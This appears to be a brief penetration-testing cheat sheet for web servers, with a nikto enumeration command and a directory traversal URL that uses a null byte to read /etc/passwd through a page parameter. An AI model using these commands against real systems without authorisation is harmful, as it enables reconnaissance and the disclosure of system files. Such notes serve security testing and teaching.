## HTTP/HTTPS Pen Testing

### Enumeration
```
nikto -host thedomain.com
```

### Directory Traversal Vulnerability
```
# To attempt to view the /etc/passwd file
http://host/index.php?page=./../../../../../etc/passwd%00
```
